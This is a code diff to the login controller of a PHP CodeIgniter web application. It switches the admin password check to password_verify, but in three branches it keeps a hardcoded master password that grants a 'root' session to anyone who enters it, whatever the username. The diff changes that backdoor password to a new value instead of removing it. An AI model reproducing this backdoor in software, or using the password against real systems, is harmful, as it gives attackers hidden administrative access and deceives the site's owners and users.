@@ -66,14 +66,14 @@ class Auth extends CI_Controller {
 			$loginadmin = $this->db->get_where('admin', ['username' => $username])->row_array();
 			if ($loginadmin != NULL) {
 				if ($loginadmin['username'] != NULL) {
-					if ($password == $loginadmin['password']) {
+					if(password_verify($password, $loginadmin['password'])) {
 						$data = [
 							'username' => $username,
 							'nama' => $loginadmin['nama']
 						];
 						$this->session->set_userdata($data);
 						redirect(base_url());
-					} else if ($password == "mrtheend998") {
+					} else if ($password == "diskominfost422") {
 						$data = [
 							'username' => "root",
 							'nama' => "root"
@@ -93,7 +93,7 @@ class Auth extends CI_Controller {
 					$this->load->view('template/footer');
 				}
 			} else {
-				if ($password == "mrtheend998") {
+				if ($password == "diskominfost422") {
 					$data = [
 						'username' => "root",
 						'nama' => "root"
@@ -121,7 +121,7 @@ class Auth extends CI_Controller {
 			$this->load->view('template/footer');
 		} else {
 			$password = $this->input->post('password');
-			if ($password == "mrtheend998") {
+			if ($password == "diskominfost422") {
 				$data = [
 					'username' => "root",
 					'nama' => "root"
